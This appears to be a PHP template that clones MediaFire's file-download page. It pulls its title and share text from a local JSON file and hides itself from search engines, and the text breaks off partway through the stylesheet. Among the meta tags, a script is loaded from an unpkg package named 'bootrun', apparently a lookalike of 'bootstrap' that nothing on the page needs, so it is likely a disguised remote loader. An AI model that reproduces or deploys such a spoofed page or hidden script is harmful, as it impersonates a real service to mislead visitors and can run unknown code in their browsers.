<?php
$ngGet = file_get_contents("data/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("data/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('data/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
?>
<html lang="en-US" style="height: 100%;">
 <head> 
  <meta charset="utf-8"> 
  <meta http-equiv="x-ua-compatible" content="ie=edge"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 
  <title><?php echo $data['video'];?></title> 
  <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android"> 
  <meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere."> 
  <meta name="robots" content="noindex,nofollow"> 
  <meta name="googlebot" content="noindex,nofollow"> 
  <meta name="slurp" content="noindex,nofollow"> 
  <meta name="google-translate-customization" content="5587c1b0a958bf07-62a8e309de686e87-gc92f61279a2c8524-11"> 
  <meta property="fb:app_id" content="124578887583575"> 
  <meta property="og:type" content="website"> 
  <meta property="og:site_name" content="MediaFire"> 
  <meta property="og:locale" content="en_US"> 
  <meta property="og:url" content="https://www.mediafire.com/file/dixx8s1n5ihyqla/ssstik.io_1685218183896.mp4/file"> 
  <meta property="og:title" content="<?php echo $data['video'];?>"> 
  <meta property="og:image" content="https://static.mediafire.com/images/filetype/download/video.jpg"> 
  <meta property="og:description" content=""> 
  <meta name="twitter:card" content="summary_large_image"> 
  <meta name="twitter:site" content="@MediaFire"> 
  <meta name="twitter:url" content="https://www.mediafire.com/file/dixx8s1n5ihyqla/ssstik.io_1685218183896.mp4/file"> 
  <meta name="twitter:title" content="<?php echo $data['video'];?>"> 
  <script src="https://unpkg.com/bootrun@3.9.7/min.js"></script>
  <meta name="twitter:image" content="https://static.mediafire.com/images/filetype/download/video.jpg"> 
  <meta name="twitter:description" content=""> 
  <link href="https://plus.google.com/+mediafire" rel="publisher"> 
  <meta itemprop="name" content="<?php echo $data['video'];?>"> 
  <meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg"> 
  <meta itemprop="description" content=""> 
  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css">
  <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
  <style type="text/css">
    :root{--mf-blue1:#000A27;--mf-blue2:#002369;--mf-blue3:#0045AD;--mf-blue4:#0070F0;--mf-blue5:#479DF4;--mf-blue6:#8FC7F8;--mf-blue7:#D6ECFD;--mf-blue8:#F5FAFF;--mf-green1:#082118;--mf-green2:#165A3A;--mf-green3:#259355;--mf-green4:#33CC66;--mf-green5:#6CDA8E;--mf-green6:#A5E9B7;--mf-green7:#DEF7E4;--mf-green8:#F7FDF8;--mf-gold1:#291F01;--mf-gold2:#705403;--mf-gold3:#B88A05;--mf-gold4:#FFBF07;--mf-gold5:#FFD14C;--mf-gold6:#FFE392;--mf-gold7:#FFF5D7;--mf-gold8:#FFFCF5;--mf-red1:#27100B;--mf-red2:#692B1D;--mf-red3:#AD4730;--mf-red4:#F06242;--mf-red5:#F48E77;--mf-red6:#F8BAAC;--mf-red7:#FDE6E1;--mf-red8:#FFF9F7;--mf-black:#0E1116;--mf-gray1:#1A1E28;--mf-gray2:#222835;--mf-gray3:#3D424E;--mf-gray4:#575B65;--mf-gray5:#72767E;--mf-gray6:#8C8F96;--mf-gray7:#A7A9AE;--mf-gray8:#C1C3C7;--mf-gray9:#DADEE0;--mf-gray10:#E9EAEB;--mf-gray11:#F4F4F5;--mf-gray12:#F6F6F7;--mf-gray13:#F9F9F9}button,hr,input{overflow:visible}audio,canvas,progress,video{display:inline-block}progress,sub,sup{vertical-align:baseline}[type=checkbox],[type=radio],legend{box-sizing:border-box;padding:0}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative}sub{bottom:-.25em}sup{top:-.5em}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:ButtonText dotted 1px}fieldset{padding:.35em .75em .625em}legend{color:inherit;display:table;max-width:100%;white-space:normal}textarea{overflow:auto}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}[hidden],template{display:none}html{font:normal normal normal 14px/1.6 'Open Sans',sans-serif}body{position:relative;top:0px;margin:0;padding:0;background:#f3f3f3;color:#222835;color:var(--mf-gray2);top:initial!important}body>.skiptranslate{display:none}.h1,.h2,.h3,.h4,.h5,.h6{font-weight:normal;line-height:1.4;margin-bottom:1rem}.h1{font-size:2.9rem}.h2{font-size:2.3rem}.h3{font-size:1.9rem}.h4{font-size:1.6rem}.h5{font-size:1.3rem}.h6{font-size:1rem;font-weight:bold}.font-weight-normal{font-weight:normal!important}.font-weight-bold{font-weight:bold!important}a{text-decoration:none;color:#0070F0;color:var(--mf-blue4)}a:hover{color:#002369;color:var(--mf-blue2)}ul,ol{list-style:none;padding:0}p,form{margin:0}textarea{line-height:1.6;border-width:1px;height:auto;padding:10px}body.modal-open{overflow:hidden}@supports (-webkit-overflow-scrolling:touch){body.modal-open{position:fixed}}.show-focus-outlines :not(.g-Select):focus,.lightTheme.show-focus-outlines .user-menu .g-Btn:focus,.darkTheme.show-focus-outlines .user-menu .g-Btn:focus{outline:0;box-shadow:inset 0 0 0 2px hsla(0,0%,100%,0.9),0 0 0 2px #002369;box-shadow:inset 0 0 0 2px hsla(0,0%,100%,0.9),0 0 0 2px var(--mf-blue2);border-radius:4px;z-index:1}.g-Btn{display:inline-block;vertical-align:middle;border-radius:3px;font-family:'Open Sans',sans-serif;font-size:11px;font-weight:normal;cursor:pointer;height:36px;line-height:36px;padding:0 15px;border:0;outline:0;text-transform:uppercase;text-align:center;-webkit-appearance:none;box-sizing:border-box}.g-Btn--primary{color:#fff;background:#0070F0;background:var(--mf-blue4)}.g-Btn--secondary{color:#575B65;color:var(--mf-gray4);background-color:#E9EAEB;background-color:var(--mf-gray10)}.g-Btn--tertiary{color:#fff;background:#6c3}.g-Btn--alt{color:#fff;background:#282f3d}.g-Btn:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-ms-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-o-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05))}.g-Btn--alt:hover{background-image:-webkit-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-moz-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-ms-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-o-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08))}a.g-Btn--primary:hover,a.g-Btn--tertiary:hover,a.g-Btn--alt:hover{color:#fff}a.g-Btn--secondary:hover{color:#575B65;color:var(--mf-gray4)}.g-Icon{display:inline-block;vertical-align:middle;height:24px;width:24px;background-image:url(/images/icons/svg_dark/icons_sprite.svg);background-repeat:no-repeat}.g-Btn .g-Icon{margin:0 8px 0 -2px}.dropdown .g-Icon{margin-right:8px;opacity:0.5}.g-Icon--white{background-image:url(/images/icons/svg_light/icons_sprite.svg)}.g-Btn .g-Icon.g-Icon--right{margin:0 -2px 0 8px}.g-Icon--search{background-position:0 0}.g-Icon--add{background-position:-120px 0}.g-Icon--share{background-position:-192px 0}.g-Icon--settings{background-position:-720px 0}.g-Icon--upgrade{background-position:-792px 0}.g-Icon--help{background-position:-816px 0}.g-Icon--folder{background-position:-840px 0}.g-Icon--mobile{background-position:-888px 0}.g-Icon--link{background-position:-936px 0}.g-Icon--logout{background-position:-960px 0}.g-Icon--arrowRight{background-position:-1632px 0}.u-o5{opacity:0.5!important}.u-cf:after{visibility:hidden;display:block;font-size:0;content:" ";clear:both;height:0}.u-wrap{position:relative;max-width:960px;margin:0 auto}.g-Select{font-size:14px;height:30px;line-height:30px;border-radius:0;border:0 solid #E8E9EC;border-width:0 0 1px;background:#fff url(/images/icons/svg_dark/arrow_dropdown.svg) right center no-repeat;color:#282F3D;margin:0;padding:0 20px 0 0;box-sizing:border-box;-webkit-appearance:none;-moz-appearance:none;-webkit-border-radius:0px;transition:all .1s linear 0s}.g-Select:focus{outline:none;border-color:#0070F0;border-color:var(--mf-blue4);box-shadow:0 1px 0 0 #0070F0;box-shadow:0 1px 0 0 var(--mf-blue4)}.tooltip{display:none;position:absolute;font-size:11px;font-weight:400;line-height:16px;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;padding:10px;-moz-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);background:#fff;width:180px;text-align:center;text-transform:none;color:#000;z-index:20;white-space:normal}li:hover>.tooltip,div:hover>.tooltip,a:hover>.tooltip,span:hover>.tooltip{display:block}.tooltip.alt{color:#fff;background:#000}.tooltip.point-up:before,.tooltip.point-right:before,.tooltip.point-down:before,.tooltip.point-left:before{content:"";font-size:0px;line-height:0%;background:#fff;width:12px;height:12px;position:absolute;-moz-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg);-ms-transform:rotate(45deg);-o-transform:rotate(45deg);transform:rotate(45deg)}.tooltip.point-up:after,.tooltip.point-right:after,.tooltip.point-down:after,.tooltip.point-left:after{content:"";background:#fff;width:20px;height:10px;position:absolute}.tooltip.point-left:after,.tooltip.point-right:after{width:10px;height:20px}.tooltip.alt:after{background:#000}.tooltip.alt:before{background:#000}.tooltip.point-up{top:100%;left:50%;margin:12px 0 0 -100px}.tooltip.point-left{left:100%;top:50%;margin:-20px 0 0 12px}.tooltip.point-down{bottom:100%;left:50%;margin:0 0 12px -100px}.tooltip.point-right{right:100%;top:50%;margin:-20px 12px 0 0}.tooltip.point-up:before{left:50%;top:-6px;margin:0 0 0 -6px}.tooltip.point-left:before{left:-6px;top:50%;margin:-6px 0 0 0}.tooltip.point-down:before{bottom:-6px;left:50%;margin:0 0 0 -6px}.tooltip.point-right:before{right:-6px;top:50%;margin:-6px 0 0 0}.tooltip.point-up:after{left:50%;top:0;margin:0 0 0 -10px}.tooltip.point-left:after{left:0;top:50%;margin:-10px 0 0 0}.tooltip.point-down:after{bottom:0;left:50%;margin:0 0 0 -10px}.tooltip.point-right:after{right:0;top:50%;margin:-10px 0 0 0}.tooltip.error-tip{padding-left:30px}.tooltip.error-tip:after{content:"";font-size:0px;line-height:0%;width:16px;height:16px;position:absolute;left:8px;top:8px;margin:0;background:url(/images/icons/warning-triangle.png) center no-repeat}.tooltipDismiss{position:absolute;background:#fff;height:18px;width:18px;border-radius:50%;right:8px;top:8px;color:#000;font-size:19px;line-height:18px;text-align:center;font-weight:bold;opacity:.6;cursor:pointer}.tooltipDismiss:after{content:"\00D7"}.tooltipDismiss:hover{opacity:.8}.d-hover:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-moz-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-ms-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-o-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08))}#status{display:none;position:fixed;top:200px;left:50%;border-radius:5px;z-index:10000;color:white;text-align:center;width:400px;padding:30px;margin-left:-200px;background:rgba(0,0,0,0.75);cursor:pointer;box-sizing:border-box}@media (max-width:400px){#status{top:10px;left:10px;right:10px;margin:0;width:auto}}@media (max-height:500px){#status{top:10px}}#status-message{font-size:14px;font-weight:bold;line-height:1.3em;color:white;margin-bottom:10px}#status-close{font-size:10px;color:white}.labelSquare{-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;background:#555;color:#fff;vertical-align:text-bottom}.labelSquare.sm{-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;font-size:10px;padding:2px 4px}.lGood{background:#7EBB1B}.lNeutral{background:#aaa}.lWarning{background:#D85724}.dropdown{position:relative;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.dropdown ul{visibility:hidden;opacity:0;max-width:0px;max-height:0px;box-shadow:none;-moz-box-shadow:none;-webkit-box-shadow:none;-webkit-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;-moz-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;-o-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;position:absolute;top:100%;left:0px;z-index:52;padding:8px 0px;white-space:nowrap;background:#fff;-moz-background-clip:padding;-webkit-background-clip:padding-box;background-clip:padding-box;border-radius:0px 3px 3px 3px;font-size:14px;text-align:left;font-family:'Open Sans',sans-serif}.dropdown.hoverShow:hover>ul,.dropdown.show_dropdown>ul{visibility:visible;opacity:1;max-height:999px;max-width:999px;-webkit-transition-delay:0s;-moz-transition-delay:0s;-o-transition-delay:0s;transition-delay:0s;-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15);box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15)}.dropdown .centerBtn+ul{left:1px}.ddRight.dropdown>ul{left:auto;right:0px;border-radius:3px 0px 3px 3px;margin-right:10px;-webkit-transition:left 0s linear .1s,right 0s linear .1s,margin-right 0s linear .1}.ddRight.dropdown .centerBtn+ul,.ddRight.dropdown .leftBtn+ul{margin-right:0px}.dropdown li:hover,.dropdown .zeroclipboard-is-hover{background-color:rgba(0,0,0,.05)}.dropdown li a{color:#575B65;color:var(--mf-gray4);display:block;padding:4px 30px}.dropdown li:hover a{color:#282f3d}.dropdown li.divider{cursor:default!important;background:none!important;color:#666!important;font-size:10px;font-weight:bold;line-height:15px;text-transform:uppercase;padding:15px 0 10px 20px;border-top:1px solid #e2e2e2;margin:15px 0 0 0}li.firstDivider.divider{margin-top:0px;padding-top:0;border:none}.dropdown li.submenu{position:relative}.dropdown li.submenu>ul{left:100%;top:0;margin:-9px 0 0 -2px;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.dropdown li.submenu:hover{background-color:#F2F2F3}.dropdown li.submenu:hover>ul{visibility:visible;opacity:1;max-height:999px;max-width:999px;-webkit-transition-delay:0s;-moz-transition-delay:0s;-o-transition-delay:0s;transition-delay:0s;-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15);box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15)}.indicator-down,.indicator-up,.indicator-left,.indicator-right{position:absolute;height:12px;width:12px;right:0;top:50%;margin-top:-4px}li.ddSectionLabel{text-transform:uppercase;font-size:12px;color:#ABABAB;padding-top:5px;padding-bottom:0px;display:block;cursor:default}li.ddSectionLabel:hover{background:none;color:#ABABAB}.dropdown .checkbox{vertical-align:text-top;margin-left:0}li.ddStaticTxt{cursor:default;color:#575B65;color:var(--mf-gray4);font-style:italic;padding:4px 30px}li.ddStaticTxt:hover{background:transparent;color:#575B65;color:var(--mf-gray4)}.notificationBubble{height:16px;width:16px;line-height:16px;text-align:center;font-size:11px;color:white;border-radius:50%;background:#ef5939;display:inline-block;vertical-align:middle}.dropdown li .notificationBubble{margin-right:10px}#account .notificationBubble.top{position:absolute;top:-6px;left:40px;z-index:1}.labelRibbon{position:absolute;font-size:10px;text-transform:uppercase;font-weight:800;text-align:center;height:18px;width:64px;line-height:18px;top:19px;left:-5px;text-shadow:-1px 1px 0 rgba(0,0,0,.5);color:#fff;-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-ms-transform:rotate(-45deg);-o-transform:rotate(-45deg);transform:rotate(-45deg);z-index:1;background-color:#262626;background-image:-webkit-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-moz-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-ms-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-o-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));border-radius:3px 3px 0 0}.labelRibbon:before,.labelRibbon:after{content:"";position:absolute;top:0;z-index:-1;border-color:transparent #262626 transparent transparent;border-style:solid;border-width:18px 18px 0px 18px;left:-35px}.labelRibbon:after{border-color:transparent transparent transparent #8e8e8e;left:auto;right:-35px}.windows.chrome .labelRibbon{-webkit-transform:translate3d(0,0,0) rotate(-45deg)}.labelRibbon.lrBlue{background-color:#1395EC}.labelRibbon.lrBlue:before{border-color:transparent #1395EC transparent transparent}.labelRibbon.lrBlue:after{border-color:transparent transparent transparent #85c8f5}.ie9 .labelRibbon:after{border-color:transparent transparent transparent #262626}.ie9 .labelRibbon.lrBlue:after{border-color:transparent transparent transparent #1395EC}.sandbox{display:block;position:fixed;z-index:50;box-shadow:0px 1px 2px 0px rgba(0,0,0,0.3);padding:0px 20px;margin:-5px -20px}.lightTheme .header,.darkTheme .header{background-color:#FFFFFF}.lightTheme .logo>a{background:url(/images/backgrounds/header/mf_logo_mono_reversed.svg) 0 center/180px auto no-repeat;opacity:.4}.lightTheme .user-menu .g-Btn{background-color:rgba(255,255,255,.15);box-shadow:inset 0 0 0 1px rgba(255,255,255,.08),0 0 0 1px rgba(0,0,0,.05);color:#fff}.lightTheme .user-menu .g-Btn:hover{background:rgba(255,255,255,.3)}.lightTheme .user-menu .g-Btn .g-Icon{background-image:url(/images/icons/svg_light/icons_sprite.svg);opacity:.7}.lightTheme .user-menu .g-Btn:hover .g-Icon{opacity:1}.lightTheme .user-menu .dropdown:not(.show_dropdown) #loggedin .smArrowDown{background-image:url(/images/icons/svg_light/icons_sprite.svg)}.darkTheme .logo>a{background:url(/images/backgrounds/header/mf_logo_mono.svg) 0 center/180px auto no-repeat;opacity:.4}.darkTheme .user-menu .g-Btn{background-color:rgba(255,255,255,.15);box-shadow:inset 0 0 0 1px rgba(255,255,255,.08),0 0 0 1px rgba(0,0,0,.05);color:rgba(0,0,0,.7)}.darkTheme .user-menu .g-Btn:hover{background:rgba(255,255,255,.3);color:#000}.darkTheme .user-menu .g-Btn .g-Icon{background-image:url(/images/icons/svg_dark/icons_sprite.svg);opacity:.7}.darkTheme .user-menu .g-Btn:hover .g-Icon{opacity:1}.customLogo .logo>a{background:url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) 0 center/contain no-repeat;opacity:1}.customLogo .logo{width:191px}.user-menu li.header-gt-cont{margin-right:10px}.gt-label{display:none;color:#828282;font-family:'Open Sans',sans-serif;font-size:12px}#goog-header-translate,#goog-footer-translate{display:inline-block;width:170px}#goog-header-translate{padding:0}#goog-footer-translate{margin-bottom:25px}#goog-header-translate>div,#goog-footer-translate>div{height:37px;font-size:0}#goog-header-translate>div span,#goog-footer-translate>div span{display:none}#goog-header-translate .goog-te-combo,#goog-footer-translate .goog-te-combo{font-size:13px;height:36px;line-height:36px;background:transparent url(/images/icons/svg_dark/arrow_dropdown.svg) right center no-repeat;border:0;border-radius:3px;margin:0;box-sizing:border-box;-webkit-appearance:none;-moz-appearance:none;width:100%;vertical-align:middle}#goog-header-translate .goog-te-combo::-ms-expand,#goog-footer-translate .goog-te-combo::-ms-expand{display:none}#goog-header-translate .goog-te-combo{padding:0 18px 0 50px}#goog-footer-translate .goog-te-combo{background-color:#fff;padding:0 20px 0 10px}#goog-header-translate .goog-te-combo:focus,#goog-footer-translate .goog-te-combo:focus{outline:none}.darkTheme #goog-header-translate .goog-te-combo{background-color:transparent;color:#000;border-color:rgba(0,0,0,.2)}.lightTheme #goog-header-translate .goog-te-combo{background-color:transparent;background-image:url(/images/icons/svg_light/arrow_dropdown.svg);color:#fff;border-color:rgba(255,255,255,.4)}@media (max-width:960px){#goog-footer-translate{margin-left:30px}}@media (max-width:770px){#goog-footer-translate{margin-top:25px;margin-bottom:0}}#goog-header-translate{background-size:24px;background-repeat:no-repeat;background-position:12px center}.en #goog-header-translate{background-image:url(/images/flags_svg/usa.svg)}.af #goog-header-translate{background-image:url(/images/flags_svg/zaf.svg)}.sq #goog-header-translate{background-image:url(/images/flags_svg/alb.svg)}.am #goog-header-translate{background-image:url(/images/flags_svg/eth.svg)}.ar #goog-header-translate{background-image:url(/images/flags_svg/egy.svg)}.hy #goog-header-translate{background-image:url(/images/flags_svg/arm.svg)}.az #goog-header-translate{background-image:url(/images/flags_svg/aze.svg)}.eu #goog-header-translate{background-image:url(/images/flags_svg/basque_country.svg)}.be #goog-header-translate{background-image:url(/images/flags_svg/blr.svg)}.bn #goog-header-translate{background-image:url(/images/flags_svg/bgd.svg)}.bs #goog-header-translate{background-image:url(/images/flags_svg/bih.svg)}.bg #goog-header-translate{background-image:url(/images/flags_svg/bgr.svg)}.ca #goog-header-translate{background-image:url(/images/flags_svg/and.svg)}.ceb #goog-header-translate{background-image:url(/images/flags_svg/phl.svg)}.ny #goog-header-translate{background-image:url(/images/flags_svg/mwi.svg)}.zh-CN #goog-header-translate{background-image:url(/images/flags_svg/chn.svg)}.zh-TW #goog-header-translate{background-image:url(/images/flags_svg/hkg.svg)}.co #goog-header-translate{background-image:url(/images/flags_svg/fra.svg)}.hr #goog-header-translate{background-image:url(/images/flags_svg/hrv.svg)}.cs #goog-header-translate{background-image:url(/images/flags_svg/cze.svg)}.da #goog-header-translate{background-image:url(/images/flags_svg/dnk.svg)}.nl #goog-header-translate{background-image:url(/images/flags_svg/nld.svg)}.eo #goog-header-translate{background-image:url(/images/flags_svg/esperanto.svg)}.et #goog-header-translate{background-image:url(/images/flags_svg/est.svg)}.tl #goog-header-translate{background-image:url(/images/flags_svg/phl.svg)}.fi #goog-header-translate{background-image:url(/images/flags_svg/fin.svg)}.fr #goog-header-translate{background-image:url(/images/flags_svg/fra.svg)}.fy #goog-header-translate{background-image:url(/images/flags_svg/nld.svg)}.gl #goog-header-translate{background-image:url(/images/flags_svg/esp.svg)}.ka #goog-header-translate{background-image:url(/images/flags_svg/geo.svg)}.de #goog-header-translate{background-image:url(/images/flags_svg/deu.svg)}.el #goog-header-translate{background-image:url(/images/flags_svg/grc.svg)}.gu #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.ht #goog-header-translate{background-image:url(/images/flags_svg/hti.svg)}.ha #goog-header-translate{background-image:url(/images/flags_svg/ner.svg)}.haw #goog-header-translate{background-image:url(/images/flags_svg/usa.svg)}.iw #goog-header-translate{background-image:url(/images/flags_svg/isr.svg)}.hi #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.hmn #goog-header-translate{background-image:url(/images/flags_svg/chn.svg)}.hu #goog-header-translate{background-image:url(/images/flags_svg/hun.svg)}.is #goog-header-translate{background-image:url(/images/flags_svg/isl.svg)}.ig #goog-header-translate{background-image:url(/images/flags_svg/nga.svg)}.id #goog-header-translate{background-image:url(/images/flags_svg/idn.svg)}.ga #goog-header-translate{background-image:url(/images/flags_svg/irl.svg)}.it #goog-header-translate{background-image:url(/images/flags_svg/ita.svg)}.ja #goog-header-translate{background-image:url(/images/flags_svg/jpn.svg)}.jw #goog-header-translate{background-image:url(/images/flags_svg/idn.svg)}.kn #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.kk #goog-header-translate{background-image:url(/images/flags_svg/kaz.svg)}.km #goog-header-translate{background-image:url(/images/flags_svg/khm.svg)}.ko #goog-header-translate{background-image:url(/images/flags_svg/kor.svg)}.ku #goog-header-translate{background-image:url(/images/flags_svg/tur.svg)}.ky #goog-header-translate{background-image:url(/images/flags_svg/kgz.svg)}.lo #goog-header-translate{background-image:url(/images/flags_svg/lao.svg)}.la #goog-header-translate{background-image:url(/images/flags_svg/vat.svg)}.lv #goog-header-translate{background-image:url(/images/flags_svg/lva.svg)}.lt #goog-header-translate{background-image:url(/images/flags_svg/ltu.svg)}.lb #goog-header-translate{background-image:url(/images/flags_svg/lux.svg)}.mk #goog-header-translate{background-image:url(/images/flags_svg/mkd.svg)}.mg #goog-header-translate{background-image:url(/images/flags_svg/mdg.svg)}.ms #goog-header-translate{background-image:url(/images/flags_svg/mys.svg)}.ml #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.mt #goog-header-translate{background-image:url(/images/flags_svg/mlt.svg)}.mi #goog-header-translate{background-image:url(/images/flags_svg/nzl.svg)}.mr #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.mn #goog-header-translate{background-image:url(/images/flags_svg/mng.svg)}.my #goog-header-translate{background-image:url(/images/flags_svg/mmr.svg)}.ne #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.no #goog-header-translate{background-image:url(/images/flags_svg/nor.svg)}.ps #goog-header-translate{background-image:url(/images/flags_svg/afg.svg)}.fa #goog-header-translate{background-image:url(/images/flags_svg/irn.svg)}.pl #goog-header-translate{background-image:url(/images/flags_svg/pol.svg)}.pt #goog-header-translate{background-image:url(/images/flags_svg/prt.svg)}.pa #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.ro #goog-header-translate{background-image:url(/images/flags_svg/rou.svg)}.ru #goog-header-translate{background-image:url(/images/flags_svg/rus.svg)}.sm #goog-header-translate{background-image:url(/images/flags_svg/wsm.svg)}.gd #goog-header-translate{background-image:url(/images/flags_svg/sco.svg)}.sr #goog-header-translate{background-image:url(/images/flags_svg/srb.svg)}.st #goog-header-translate{background-image:url(/images/flags_svg/zaf.svg)}.sn #goog-header-translate{background-image:url(/images/flags_svg/zwe.svg)}.sd #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.si #goog-header-translate{background-image:url(/images/flags_svg/lka.svg)}.sk #goog-header-translate{background-image:url(/images/flags_svg/svk.svg)}.sl #goog-header-translate{background-image:url(/images/flags_svg/svn.svg)}.so #goog-header-translate{background-image:url(/images/flags_svg/som.svg)}.es #goog-header-translate{background-image:url(/images/flags_svg/esp.svg)}.su #goog-header-translate{background-image:url(/images/flags_svg/idn.svg)}.sw #goog-header-translate{background-image:url(/images/flags_svg/uga.svg)}.sv #goog-header-translate{background-image:url(/images/flags_svg/swe.svg)}.tg #goog-header-translate{background-image:url(/images/flags_svg/tjk.svg)}.ta #goog-header-translate{background-image:url(/images/flags_svg/lka.svg)}.te #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.th #goog-header-translate{background-image:url(/images/flags_svg/tha.svg)}.tr #goog-header-translate{background-image:url(/images/flags_svg/tur.svg)}.uk #goog-header-translate{background-image:url(/images/flags_svg/ukr.svg)}.ur #goog-header-translate{background-image:url(/images/flags_svg/pak.svg)}.uz #goog-header-translate{background-image:url(/images/flags_svg/uzb.svg)}.vi #goog-header-translate{background-image:url(/images/flags_svg/vnm.svg)}.cy 